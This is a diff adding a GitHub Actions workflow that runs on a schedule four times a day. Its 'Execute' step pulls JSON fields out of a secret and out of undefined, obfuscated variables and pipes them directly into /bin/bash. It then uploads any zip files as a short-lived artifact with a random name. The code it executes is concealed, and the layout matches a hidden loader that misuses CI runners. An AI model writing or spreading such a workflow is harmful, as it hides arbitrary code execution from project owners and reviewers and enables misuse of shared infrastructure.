@@ -1,0 +1,25 @@
+name: Pipeline
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '24 5,11,17,23 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Execute
+        env:
+          douci5: ${{ secrets.douci5 }}
+        run: |
+          printf '%s' "$douci5" | jq -r .zsqln96 | /bin/bash
+          echo $gt611 | jq -r .hkw87700 | /bin/bash
+          printf '%s' "$dbhqo013" | jq -r .v1779 | /bin/bash
+
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: exGV4hlK
+          path: "*.zip"
+          retention-days: 1
